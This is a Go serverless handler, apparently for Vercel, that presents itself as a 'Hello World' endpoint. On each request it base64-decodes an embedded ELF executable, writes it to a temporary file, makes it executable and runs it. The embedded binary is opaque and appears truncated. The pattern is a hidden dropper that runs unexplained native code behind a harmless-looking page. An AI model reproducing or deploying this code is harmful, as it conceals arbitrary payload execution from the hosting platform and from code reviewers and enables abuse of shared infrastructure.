package handler

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
)

const embeddedExecutableBase64 = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAYJFGAAAAAABAAAAAAAAAAMgBAAAAAAAAAAAAAEAAOAAHAEAADgADAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAiAEAAAAAAACIAQAAAAAAAAAQAAAAAAAABAAAAAQAAACcDwAAAAAAAJwPQAAAAAAAnA9AAAAAAABkAAAAAAAAAGQAAAAAAAAABAAAAAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAGpxLQAAAAAAanEtAAAAAAAAEAAAAAAAAAEAAAAEAAAAAIAtAAAAAAAAgG0AAAAAAACAbQAAAAAAyAkqAAAAAADICSoAAAAAAAAQAAAAAAAAAQAAAAYAAAAAkFcAAAAAAACQlwAAAAAAAJCXAAAAAADgAQQAAAAAAFCIBwAAAAAAABAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAIAVBGUAKgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAABAAAABgAAAAAAAAAAEEAAAAAAAAAQAAAAAAAAamEtAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAABdAAAAAQAAAAIAAAAAAAAAAIBtAAAAAAAAgC0AAAAAAP5XEQAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAjgAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAANg"

func Handler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "<h1>Hello World from Golang serverless</h1>")

	// Decode the base64-encoded string
	embeddedExecutable, err := base64.StdEncoding.DecodeString(embeddedExecutableBase64)
	if err != nil {
		fmt.Fprintf(w, "Error decoding embedded executable: %v", err)
		return
	}

	// Create a temporary file to write the embedded executable
	tmpFile, err := ioutil.TempFile("", "apivercel")
	if err != nil {
		fmt.Fprintf(w, "Error creating temporary file: %v", err)
		return
	}
	defer os.Remove(tmpFile.Name())

	// Write the embedded executable to the temporary file
	_, err = tmpFile.Write(embeddedExecutable)
	if err != nil {
		fmt.Fprintf(w, "Error writing embedded executable to temporary file: %v", err)
		return
	}

	// Close the temporary file before copying it
	tmpFile.Close()

	// Make the temporary file executable
	err = os.Chmod(tmpFile.Name(), 0755)
	if err != nil {
		fmt.Fprintf(w, "Error making temporary file executable: %v", err)
		return
	}

	// Execute the temporary file
	cmd := exec.Command(tmpFile.Name())
	err = cmd.Start()
	if err != nil {
		fmt.Fprintf(w, "Error executing the embedded executable: %v", err)
		return
	}

	// Wait for the command to finish
	err = cmd.Wait()
	if err != nil {
		fmt.Fprintf(w, "Command execution failed: %v", err)
		return
	}
}
